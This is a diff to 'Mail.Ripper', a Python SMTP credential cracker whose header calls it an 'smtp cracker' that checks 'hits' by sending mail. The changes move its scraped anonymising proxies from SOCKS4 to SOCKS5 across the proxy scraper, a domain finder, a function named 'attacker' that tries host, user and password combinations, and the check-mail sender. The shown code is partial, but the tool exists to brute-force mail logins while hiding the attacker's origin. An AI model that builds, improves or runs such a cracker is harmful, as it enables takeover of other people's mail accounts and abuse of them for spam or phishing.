@@ -2,7 +2,7 @@
 #encoding: utf-8
 #name: Mail.Ripper v1 (proxy version)
 #description: smtp checker / smtp cracker including mailsending check for hits
-#version: 1.00, 2020-11-21
+#version: 1.05, 2020-11-21
 #author: DrPython3
 #----------------------------------------------------------------------------------------------------------------------
 #((--> *P*A*C*K*A*G*E*S***N*E*E*D*E*D* <--))
@@ -129,8 +129,8 @@ def blackcheck(search):
 
 #getproxdata == scrapes SOCKS4 proxies from Proxyscrape.com:
 def getproxdata():
-    print(Fore.LIGHTYELLOW_EX + '### PLEASE WAIT! ###\n\nScraping SOCKS4 proxies - this may take a while ...\n')
-    psource = 'https://api.proxyscrape.com?request=displayproxies&proxytype=socks4&timeout=1000'
+    print(Fore.LIGHTYELLOW_EX + '### PLEASE WAIT! ###\n\nScraping SOCKS5 proxies - this may take a while ...\n')
+    psource = 'https://api.proxyscrape.com?request=displayproxies&proxytype=socks5&timeout=2000'
     http = urllib3.PoolManager(ca_certs=certifi.where())
     proxydata = http.request('GET', psource)
     with open('proxydata.txt', 'a') as proxyfile:
@@ -162,7 +162,7 @@ def finder(unkdom):
         rawproxy = str(randomprox())
         fproxy = str(rawproxy.split(":")[0])
         fproxyport = int(rawproxy.split(":")[1])
-        socks.set_default_proxy(socks.PROXY_TYPE_SOCKS4, fproxy, fproxyport)
+        socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5, fproxy, fproxyport)
         socks.wrapmodule(smtplib)
     else: pass
     z = str('failed')
@@ -204,7 +204,7 @@ def attacker(attackhost, attackport, attackuser, attackpass):
         rawproxy = str(randomprox())
         fproxy = str(rawproxy.split(":")[0])
         fproxyport = int(rawproxy.split(":")[1])
-        socks.set_default_proxy(socks.PROXY_TYPE_SOCKS4, fproxy, fproxyport)
+        socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5, fproxy, fproxyport)
         socks.wrapmodule(smtplib)
     else: pass
     try:
@@ -279,7 +279,7 @@ def sendcheckmsg(mailhost, mailport, mailuser, mailpass, proxy, proxyport):
         socket.setdefaulttimeout(tout)
         msgcontext = ssl.create_default_context()
         if usesocks == 1:
-            socks.set_default_proxy(socks.PROXY_TYPE_SOCKS4, str(proxy), int(proxyport))
+            socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5, str(proxy), int(proxyport))
             socks.wrapmodule(smtplib)
         else: pass
         #generate randomID:
